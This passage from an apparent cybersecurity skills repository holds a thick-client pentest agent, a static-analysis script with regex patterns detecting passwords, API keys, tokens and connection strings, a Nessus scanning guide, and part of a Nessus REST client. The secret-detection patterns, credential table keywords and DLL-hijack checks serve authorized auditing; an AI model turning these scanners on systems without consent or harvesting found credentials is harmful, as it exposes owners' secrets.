                r'(?i)(password|passwd|pwd|secret|api.?key|token|'
                r'connectionstring|jdbc|bearer)', re.IGNORECASE),
            "sql_query": re.compile(r'(?i)(SELECT|INSERT|UPDATE|DELETE)\s+', re.IGNORECASE),
        }
        results = {k: [] for k in patterns}
        try:
            with open(self.app_path, "rb") as f:
                data = f.read()
            text = data.decode("ascii", errors="ignore")
            for name, pattern in patterns.items():
                matches = pattern.findall(text)
                results[name] = list(set(matches))[:50]

            if results["password_hint"]:
                self.findings.append({
                    "type": "Credential Reference in Binary",
                    "severity": "Medium",
                    "details": f"Found {len(results['password_hint'])} credential-related strings",
                })
            if results["sql_query"]:
                self.findings.append({
                    "type": "SQL Queries in Binary",
                    "severity": "Medium",
                    "details": "Embedded SQL may be vulnerable to injection",
                })
        except (OSError, PermissionError) as exc:
            results["error"] = str(exc)
        return results

    def detect_framework(self):
        """Detect the application framework (.NET, Java, Electron, C++)."""
        try:
            with open(self.app_path, "rb") as f:
                header = f.read(4096)

            if b"BSJB" in header or b".NET" in header or b"mscorlib" in header:
                return {"framework": ".NET", "decompiler": "dnSpy / ILSpy"}
            if b"PK" in header[:4]:
                return {"framework": "Java (JAR)", "decompiler": "JD-GUI / JADX"}
            if b"asar" in header or b"electron" in header:
                return {"framework": "Electron", "tool": "asar extract"}
            return {"framework": "Native (C/C++)", "decompiler": "Ghidra / IDA Pro"}
        except OSError as exc:
            return {"error": str(exc)}

    def check_local_storage(self, app_name=None):
        """Scan common local storage locations for sensitive data."""
        app_name = app_name or self.app_path.stem
        locations = []
        appdata = os.environ.get("APPDATA", "")
        localappdata = os.environ.get("LOCALAPPDATA", "")

        search_dirs = [
            Path(appdata) / app_name if appdata else None,
            Path(localappdata) / app_name if localappdata else None,
            self.app_path.parent,
        ]
        sensitive_exts = {".db", ".sqlite", ".sqlite3", ".json", ".xml",
                         ".config", ".ini", ".cfg", ".log"}

        for search_dir in search_dirs:
            if search_dir is None or not search_dir.exists():
                continue
            for root, dirs, files in os.walk(search_dir):
                for fname in files:
                    fpath = Path(root) / fname
                    if fpath.suffix.lower() in sensitive_exts:
                        size = fpath.stat().st_size
                        locations.append({
                            "path": str(fpath), "type": fpath.suffix,
                            "size_bytes": size,
                        })

        if locations:
            self.findings.append({
                "type": "Sensitive Local Files",
                "severity": "Medium",
                "details": f"Found {len(locations)} potentially sensitive files",
            })
        return locations

    def audit_sqlite_databases(self, db_paths):
        """Check local SQLite databases for plaintext credentials."""
        results = []
        for db_path in db_paths:
            try:
                conn = sqlite3.connect(f"file:{db_path}?mode=ro", uri=True)
                cursor = conn.cursor()
                cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
                tables = [r[0] for r in cursor.fetchall()]

                sensitive_tables = []
                for table in tables:
                    lower = table.lower()
                    if any(kw in lower for kw in
                           ["user", "account", "credential", "auth",
                            "login", "password", "token", "session"]):
                        if not _SAFE_TABLE_RE.match(table):
                            continue
                        cursor.execute(f"SELECT COUNT(*) FROM [{table}]")
                        count = cursor.fetchone()[0]
                        sensitive_tables.append({"table": table, "rows": count})

                if sensitive_tables:
                    self.findings.append({
                        "type": "Sensitive SQLite Database",
                        "severity": "High",
                        "details": f"{db_path}: {sensitive_tables}",
                    })
                results.append({"database": db_path, "tables": tables,
                                "sensitive_tables": sensitive_tables})
                conn.close()
            except sqlite3.Error as exc:
                results.append({"database": db_path, "error": str(exc)})
        return results

    def check_dll_hijack_paths(self):
        """Check for DLL hijacking via writable directories in PATH."""
        writable_dirs = []
        path_dirs = os.environ.get("PATH", "").split(os.pathsep)
        for d in path_dirs:
            if os.path.isdir(d) and os.access(d, os.W_OK):
                writable_dirs.append(d)

        app_dir = str(self.app_path.parent)
        app_dir_writable = os.access(app_dir, os.W_OK)

        if writable_dirs or app_dir_writable:
            self.findings.append({
                "type": "DLL Hijacking Risk",
                "severity": "High",
                "details": f"Writable PATH dirs: {len(writable_dirs)}, "
                           f"App dir writable: {app_dir_writable}",
            })
        return {"writable_path_dirs": writable_dirs,
                "app_dir_writable": app_dir_writable}

    def generate_report(self):
        """Generate comprehensive pentest findings report."""
        report = {
            "target": str(self.app_path),
            "report_date": datetime.utcnow().isoformat(),
            "framework": self.detect_framework(),
            "total_findings": len(self.findings),
            "critical": sum(1 for f in self.findings if f["severity"] == "Critical"),
            "high": sum(1 for f in self.findings if f["severity"] == "High"),
            "medium": sum(1 for f in self.findings if f["severity"] == "Medium"),
            "findings": self.findings,
        }
        report_path = self.output_dir / "thick_client_report.json"
        with open(report_path, "w") as f:
            json.dump(report, f, indent=2)
        print(json.dumps(report, indent=2))
        return report


def main():
    if len(sys.argv) < 2:
        print("Usage: agent.py <application.exe> [output_dir]")
        sys.exit(1)
    app_path = sys.argv[1]
    output_dir = sys.argv[2] if len(sys.argv) > 2 else "./thick_client_pentest"
    agent = ThickClientPentestAgent(app_path, output_dir)
    agent.extract_strings()
    agent.check_local_storage()
    agent.check_dll_hijack_paths()
    agent.generate_report()


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-thick-client-application-penetration-test/scripts/process.py =====
#!/usr/bin/env python3
"""
Thick Client Penetration Test — Static Analysis Helper

Performs basic static analysis on thick client applications: string extraction,
config file scanning, and DLL dependency analysis.

Usage:
    python process.py --app-dir "C:/Program Files/TargetApp" --output ./results
"""

import os
import re
import json
import argparse
import datetime
from pathlib import Path


SENSITIVE_PATTERNS = {
    "password": re.compile(r'(?i)(password|passwd|pwd)\s*[=:]\s*["\']?([^\s"\']+)'),
    "api_key": re.compile(r'(?i)(api[_-]?key|apikey)\s*[=:]\s*["\']?([^\s"\']+)'),
    "connection_string": re.compile(r'(?i)(connection[_-]?string|jdbc:)\s*[=:]\s*["\']?([^\s"\']+)'),
    "secret": re.compile(r'(?i)(secret|token)\s*[=:]\s*["\']?([^\s"\']+)'),
    "url_with_creds": re.compile(r'https?://[^:]+:[^@]+@[\w.]+'),
    "hardcoded_ip": re.compile(r'\b(?:10|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d{1,3}\.\d{1,3}\b'),
}


def extract_strings(filepath: str, min_length: int = 8) -> list[str]:
    """Extract printable strings from a binary file."""
    strings = []
    try:
        with open(filepath, "rb") as f:
            data = f.read()

        current = []
        for byte in data:
            if 32 <= byte <= 126:
                current.append(chr(byte))
            else:
                if len(current) >= min_length:
                    strings.append("".join(current))
                current = []
        if len(current) >= min_length:
            strings.append("".join(current))
    except (PermissionError, OSError):
        pass
    return strings


def scan_for_secrets(strings: list[str]) -> list[dict]:
    """Scan extracted strings for sensitive patterns."""
    findings = []
    for s in strings:
        for name, pattern in SENSITIVE_PATTERNS.items():
            match = pattern.search(s)
            if match:
                findings.append({
                    "type": name,
                    "match": s[:200],
                    "severity": "High" if name in ("password", "connection_string", "secret") else "Medium"
                })
                break
    return findings


def scan_config_files(app_dir: str) -> list[dict]:
    """Scan configuration files for sensitive data."""
    config_extensions = {".config", ".xml", ".json", ".ini", ".properties", ".yaml", ".yml", ".cfg"}
    findings = []

    for root, dirs, files in os.walk(app_dir):
        for filename in files:
            ext = os.path.splitext(filename)[1].lower()
            if ext in config_extensions:
                filepath = os.path.join(root, filename)
                try:
                    with open(filepath, encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                    for name, pattern in SENSITIVE_PATTERNS.items():
                        matches = pattern.findall(content)
                        for match in matches:
                            findings.append({
                                "file": filepath,
                                "type": name,
                                "match": str(match)[:200],
                                "severity": "High"
                            })
                except (PermissionError, OSError):
                    continue
    return findings


def analyze_dlls(app_dir: str) -> list[dict]:
    """Analyze DLL dependencies for potential hijacking."""
    dlls = []
    for root, dirs, files in os.walk(app_dir):
        for filename in files:
            if filename.lower().endswith(".dll"):
                filepath = os.path.join(root, filename)
                dlls.append({
                    "name": filename,
                    "path": filepath,
                    "writable": os.access(filepath, os.W_OK),
                    "size": os.path.getsize(filepath)
                })

    writable = [d for d in dlls if d["writable"]]
    return dlls, writable


def generate_report(app_dir: str, string_findings: list[dict],
                     config_findings: list[dict], dll_info: tuple,
                     output_dir: Path) -> str:
    """Generate thick client analysis report."""
    report_file = output_dir / "thick_client_report.md"
    timestamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M UTC")
    all_dlls, writable_dlls = dll_info

    with open(report_file, "w") as f:
        f.write("# Thick Client Static Analysis Report\n\n")
        f.write(f"**Application:** {app_dir}\n")
        f.write(f"**Generated:** {timestamp}\n\n---\n\n")

        f.write("## Binary String Analysis\n\n")
        if string_findings:
            f.write(f"Found **{len(string_findings)}** potentially sensitive strings:\n\n")
            f.write("| Type | Match | Severity |\n|------|-------|----------|\n")
            for finding in string_findings[:50]:
                f.write(f"| {finding['type']} | `{finding['match'][:80]}` | {finding['severity']} |\n")
        else:
            f.write("No sensitive strings detected in binaries.\n")
        f.write("\n")

        f.write("## Configuration File Analysis\n\n")
        if config_findings:
            f.write(f"Found **{len(config_findings)}** sensitive entries in configs:\n\n")
            for finding in config_findings[:20]:
                f.write(f"- **{finding['type']}** in `{finding['file']}`: `{finding['match'][:80]}`\n")
        else:
            f.write("No sensitive data found in configuration files.\n")
        f.write("\n")

        f.write("## DLL Analysis\n\n")
        f.write(f"Total DLLs: **{len(all_dlls)}**\n")
        f.write(f"Writable DLLs (potential hijacking): **{len(writable_dlls)}**\n\n")
        if writable_dlls:
            f.write("| DLL | Path |\n|-----|------|\n")
            for dll in writable_dlls:
                f.write(f"| {dll['name']} | {dll['path']} |\n")
        f.write("\n")

    print(f"[+] Report: {report_file}")
    return str(report_file)


def main():
    parser = argparse.ArgumentParser(description="Thick Client Static Analysis")
    parser.add_argument("--app-dir", required=True, help="Application installation directory")
    parser.add_argument("--output", default="./results")
    args = parser.parse_args()

    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)

    print(f"[*] Scanning {args.app_dir}...")

    # Scan binaries for strings
    all_findings = []
    for root, dirs, files in os.walk(args.app_dir):
        for filename in files:
            if filename.lower().endswith((".exe", ".dll")):
                filepath = os.path.join(root, filename)
                strings = extract_strings(filepath)
                findings = scan_for_secrets(strings)
                all_findings.extend(findings)

    # Scan config files
    config_findings = scan_config_files(args.app_dir)

    # Analyze DLLs
    dll_info = analyze_dlls(args.app_dir)

    generate_report(args.app_dir, all_findings, config_findings, dll_info, output_dir)
    print("[+] Analysis complete")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-vulnerability-scanning-with-nessus/SKILL.md =====
---
name: performing-vulnerability-scanning-with-nessus
description: 'Performs authenticated and unauthenticated vulnerability scanning using
  Tenable Nessus to identify known vulnerabilities, misconfigurations, default credentials,
  and missing patches across network infrastructure, servers, and applications. The
  scanner correlates findings with CVE databases and CVSS scores to produce prioritized
  remediation guidance. Activates for requests involving vulnerability scanning, Nessus
  assessment, patch compliance checking, or automated vulnerability detection.

  '
domain: cybersecurity
subdomain: penetration-testing
tags:
- vulnerability-scanning
- Nessus
- CVE
- patch-management
- Tenable
version: 1.0.0
author: mahipal
license: Apache-2.0
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1595
- T1190
- T1059
- T1078
- T1003
---
# Performing Vulnerability Scanning with Nessus

## When to Use

- Conducting initial vulnerability assessment during the reconnaissance phase of a penetration test
- Performing periodic vulnerability scans to maintain compliance with PCI-DSS (requirement 11.2), HIPAA, or SOC 2 standards
- Validating that remediation efforts have successfully addressed previously identified vulnerabilities
- Establishing a baseline of known vulnerabilities before targeted manual exploitation
- Auditing patch compliance and configuration drift across server and workstation fleets

**Do not use** as a substitute for manual penetration testing, against systems without written authorization, or against fragile systems (medical devices, legacy SCADA) where scanning may cause service disruption.

## Prerequisites

- Tenable Nessus Professional or Nessus Expert with current plugin updates (plugins should be less than 24 hours old)
- Network connectivity to all target hosts on all ports (no firewall restrictions between scanner and targets)
- Administrative credentials for authenticated scanning (domain admin or local admin for Windows, root/sudo for Linux, SNMP community strings for network devices)
- Target IP ranges and hostnames documented in the scope agreement
- Change management approval for scanning during authorized windows

## Workflow

### Step 1: Scan Configuration

Configure the Nessus scan policy based on engagement requirements:

- **Scan type selection**: Choose "Advanced Scan" for full control over plugin families, or "Credentialed Patch Audit" for patch compliance. Avoid "Basic Network Scan" for penetration tests as it uses a limited plugin set.
- **Discovery settings**: Configure port scanning to scan all 65,535 TCP ports and top 1,000 UDP ports. Set host discovery to use ARP (local), TCP SYN, and ICMP for maximum coverage.
- **Authentication**: Add Windows credentials (domain account with local admin), SSH credentials (key-based preferred over password), SNMP credentials (v3 with authPriv preferred), and database credentials for database-specific checks.
- **Plugin configuration**: Enable all plugin families relevant to the target environment. For penetration testing, ensure "Denial of Service" plugins are disabled unless explicitly authorized. Enable CGI scanning for web servers.
- **Performance settings**: Set maximum concurrent hosts per scanner (default 30, reduce for sensitive networks), maximum concurrent checks per host (4-5 for production, higher for test environments), and network timeout values appropriate for the target network.

### Step 2: Scan Execution and Monitoring

Launch the scan and monitor for issues:

- Start the scan during the authorized testing window
- Monitor scan progress through the Nessus web interface, checking for hosts timing out, authentication failures, or plugins causing errors
- Watch for credential failures indicated by "Authentication Failure" results; these mean the authenticated scan fell back to unauthenticated mode, producing incomplete results
- If specific hosts are crashing or becoming unresponsive, pause the scan, exclude those hosts, and report the issue to the client
- For large networks (1,000+ hosts), consider splitting scans into smaller subnets to manage load and allow restartability

### Step 3: Results Analysis and Validation

Analyze scan results to separate true positives from false positives:

- **Sort by severity**: Start with Critical and High findings; these represent the most exploitable and impactful vulnerabilities
- **Validate authentication**: Verify that plugin 19506 (Nessus Scan Information) shows "Credentialed checks: yes" for each host. Unauthenticated results miss local vulnerabilities.
- **Eliminate informational noise**: Filter out informational findings unless they reveal useful information for manual testing (service banners, SSL certificate details, open ports)
- **Cross-reference CVEs**: For each Critical/High finding, verify the CVE in the National Vulnerability Database. Check if the vulnerability has a public exploit (Exploit-DB, Metasploit module).
- **False positive identification**: Common false positives include version-based detection where backported patches make the software appear vulnerable (common in RHEL/CentOS). Check `rpm -q --changelog <package>` on the target to verify.
- **Group by remediation**: Organize findings by the action needed to fix them (e.g., "Apply Windows KB5034441" affects 47 hosts) rather than listing each instance individually

### Step 4: Vulnerability Prioritization

Rank validated vulnerabilities for remediation using risk-based prioritization:

- **CVSS score**: Use the CVSS v3.1 base score as the starting point. Scores 9.0-10.0 are Critical, 7.0-8.9 High, 4.0-6.9 Medium, 0.1-3.9 Low.
- **Exploit availability**: Increase priority for vulnerabilities with publicly available exploit code, especially Metasploit modules or weaponized PoCs
- **Network exposure**: A critical vulnerability on an internet-facing system is higher priority than the same vulnerability on an isolated internal server
- **Asset criticality**: Consider the business value of the affected system. Domain controllers, databases with PII, and payment processing systems warrant higher priority.
- **Compensating controls**: Reduce priority if the vulnerability is mitigated by network segmentation, WAF rules, or EDR protections (document the compensating control)

### Step 5: Report Generation

Generate a comprehensive vulnerability scan report:

- Export the Nessus report in both executive (PDF) and detailed (CSV/HTML) formats
- Create a custom report that includes only validated findings with false positives removed
- Include a remediation priority matrix mapping each vulnerability to its recommended fix, affected hosts, and timeline
- Add context from manual validation (e.g., "This finding was confirmed exploitable during the penetration test")
- Include scan metadata: date/time, scanner version, plugin set date, scan policy used, authentication success rate

## Key Concepts

| Term | Definition |
|------|------------|
| **Authenticated Scan** | A vulnerability scan that uses valid credentials to log into target hosts and perform local checks, detecting significantly more vulnerabilities than unauthenticated scanning |
| **Plugin** | A Nessus script that checks for a specific vulnerability, misconfiguration, or compliance item; Nessus maintains over 200,000 plugins updated daily |
| **CVSS** | Common Vulnerability Scoring System; a standardized framework for rating the severity of vulnerabilities from 0.0 to 10.0 based on exploitability and impact metrics |
| **False Positive** | A vulnerability reported by the scanner that does not actually exist on the target, often caused by version-based detection without exploit verification |
| **Credentialed Patch Audit** | A scan type focused specifically on identifying missing operating system and application patches by comparing installed versions against known vulnerability databases |
| **Plugin Family** | A logical grouping of Nessus plugins by category (e.g., Windows, Ubuntu Local Security Checks, Web Servers, Databases) |

## Tools & Systems

- **Nessus Professional**: Commercial vulnerability scanner by Tenable with over 200,000 plugins covering CVEs, misconfigurations, and compliance checks
- **Nessus Expert**: Extended version including external attack surface scanning, IaC scanning, and cloud infrastructure assessment
- **Tenable.io**: Cloud-hosted vulnerability management platform for enterprise deployments with asset tracking, trend analysis, and prioritization
- **OpenVAS (Greenbone)**: Open-source alternative vulnerability scanner with community-maintained vulnerability tests for comparison scanning

## Common Scenarios

### Scenario: Quarterly PCI-DSS Vulnerability Scan for a Retail Company

**Context**: A retailer processes credit card payments and must comply with PCI-DSS requirement 11.2, which mandates quarterly internal and external vulnerability scans. The cardholder data environment (CDE) consists of 200 servers across 3 VLANs. All hosts run either Windows Server 2019/2022 or RHEL 8/9.

**Approach**:
1. Configure authenticated scan with domain service account for Windows and SSH key for Linux hosts
2. Use the PCI-DSS scan policy template with all relevant plugin families enabled
3. Scan all 200 CDE hosts during the Saturday maintenance window (02:00-06:00)
4. Identify 847 findings: 12 Critical, 34 High, 189 Medium, 612 Low/Informational
5. Validate Critical findings: 3 are false positives (backported patches on RHEL), 9 are confirmed vulnerabilities
6. Group remaining findings by remediation action: 6 require Windows patches, 2 require Apache upgrades, 1 requires TLS configuration hardening
7. Generate PCI-compliant report showing no Critical or High vulnerabilities remain unaddressed (after remediation and rescan)

**Pitfalls**:
- Running unauthenticated scans and missing the majority of local vulnerabilities, producing an incomplete compliance report
- Not updating Nessus plugins before scanning, missing recently published CVEs
- Scanning fragile legacy systems without reducing scan intensity, causing crashes or service disruption
- Accepting Nessus results at face value without manually validating critical findings for false positives

## Output Format

```
## Vulnerability Scan Summary - CDE Environment

**Scan Date**: 2025-11-15 02:00-05:47 UTC
**Scanner**: Nessus Professional 10.8.3 (Plugins: 2025-11-14)
**Hosts Scanned**: 200 (198 authenticated, 2 authentication failed)
**Scan Policy**: PCI-DSS Internal Scan

### Findings Summary
| Severity | Count | Validated |
|----------|-------|-----------|
| Critical | 12    | 9 (3 FP)  |
| High     | 34    | 31 (3 FP) |
| Medium   | 189   | 178       |
| Low/Info | 612   | N/A       |

### Top Critical Findings

**1. CVE-2024-21762 - Fortinet FortiOS Out-of-Bounds Write (CVSS 9.8)**
- Affected Hosts: fw-cde-01.corp.example.com (10.50.1.1)
- Exploit Available: Yes (Metasploit module)
- Remediation: Upgrade FortiOS to 7.4.3 or later
- Priority: Immediate - internet-facing device protecting CDE

**2. CVE-2024-6387 - OpenSSH regreSSHion (CVSS 8.1)**
- Affected Hosts: 14 Linux servers (see Appendix A)
- Exploit Available: Yes (public PoC)
- Remediation: Upgrade OpenSSH to 9.8p1 or later
- Priority: Within 7 days - authenticated remote code execution
```

===== END FILE =====


===== FILE: skills/performing-vulnerability-scanning-with-nessus/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/performing-vulnerability-scanning-with-nessus/references/api-reference.md =====
# API Reference: Vulnerability Scanning with Nessus Agent

## Overview

Manages Tenable Nessus vulnerability scans via the REST API: scan creation, launch, monitoring, result analysis, and CSV/PDF export.

## Dependencies

| Package | Version | Purpose |
|---------|---------|---------|
| requests | >= 2.28 | HTTP client for Nessus REST API |
| urllib3 | >= 1.26 | TLS warning suppression |

## NessusAPI Class

### Constructor

```python
NessusAPI(url="https://localhost:8834", access_key=None, secret_key=None)
```

Authentication via `X-ApiKeys` header with access/secret key pair.

### Methods

| Method | Description | Returns |
|--------|-------------|---------|
| `get_server_status()` | Check Nessus server readiness | `dict` |
| `list_scans()` | List all scans with id, name, status | `list[dict]` |
| `get_scan_details(scan_id)` | Full scan results with severity counts and top vulns | `dict` |
| `create_scan(name, targets, policy_id, template)` | Create new scan configuration | `dict` |
| `launch_scan(scan_id)` | Start a configured scan | `dict` |
| `get_scan_status(scan_id)` | Poll scan status | `str` |
| `wait_for_scan(scan_id, poll_interval, timeout)` | Block until scan completes | `bool` |
| `export_scan(scan_id, fmt)` | Export results as csv, html, or pdf | `bytes` |
| `check_auth_status(scan_id)` | Verify authenticated scanning via plugin 19506 | `list[dict]` |

## Nessus REST API Endpoints

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/server/status` | GET | Server health check |
| `/scans` | GET | List all scans |
| `/scans` | POST | Create new scan |
| `/scans/{id}` | GET | Scan details and results |
| `/scans/{id}/launch` | POST | Launch scan |
| `/scans/{id}/export` | POST | Initiate report export |
| `/scans/{id}/export/{file_id}/download` | GET | Download exported report |
| `/editor/scan/templates` | GET | Available scan templates |

## Environment Variables

| Variable | Required | Description |
|----------|----------|-------------|
| `NESSUS_URL` | No | Nessus server URL (default: https://localhost:8834) |
| `NESSUS_ACCESS_KEY` | Yes | API access key |
| `NESSUS_SECRET_KEY` | Yes | API secret key |

## Severity Mapping

| Value | Label | CVSS Range |
|-------|-------|------------|
| 4 | Critical | 9.0-10.0 |
| 3 | High | 7.0-8.9 |
| 2 | Medium | 4.0-6.9 |
| 1 | Low | 0.1-3.9 |
| 0 | Info | N/A |

## Usage

```bash
export NESSUS_ACCESS_KEY="your-access-key"
export NESSUS_SECRET_KEY="your-secret-key"
python agent.py
```

===== END FILE =====


===== FILE: skills/performing-vulnerability-scanning-with-nessus/scripts/agent.py =====
#!/usr/bin/env python3
"""Vulnerability scanning agent using the Nessus REST API."""

import json
import sys
import time
import os
import urllib3

try:
    import requests
except ImportError:
    print("Install: pip install requests")
    sys.exit(1)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class NessusAPI:
    def __init__(self, url=None, access_key=None, secret_key=None):
        url = url or os.environ.get("NESSUS_URL", "https://localhost:8834")
        self.url = url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False
        if access_key and secret_key:
            self.session.headers.update({
                "X-ApiKeys": f"accessKey={access_key}; secretKey={secret_key}"
            })

    def _get(self, endpoint):
        resp = self.session.get(f"{self.url}{endpoint}", timeout=30)
        resp.raise_for_status()
        return resp.json()

    def _post(self, endpoint, data=None):
        resp = self.session.post(f"{self.url}{endpoint}", json=data, timeout=30)
        resp.raise_for_status()
        return resp.json()

    def _put(self, endpoint, data=None):
        resp = self.session.put(f"{self.url}{endpoint}", json=data, timeout=30)
        resp.raise_for_status()
        return resp.json()

    def get_server_status(self):
        return self._get("/server/status")

    def list_scans(self):
        data = self._get("/scans")
        scans = []
        for scan in data.get("scans", []):
            scans.append({
                "id": scan["id"], "name": scan["name"],
                "status": scan["status"],
                "folder_id": scan.get("folder_id"),
            })
        return scans

    def get_scan_details(self, scan_id):
        data = self._get(f"/scans/{scan_id}")
        info = data.get("info", {})
        hosts = data.get("hosts", [])
        vulns = data.get("vulnerabilities", [])
        return {
            "scan_id": scan_id,
            "name": info.get("name"),
            "status": info.get("status"),
            "host_count": info.get("hostcount", len(hosts)),
            "targets": info.get("targets"),
            "start_time": info.get("scanner_start"),
            "end_time": info.get("scanner_end"),
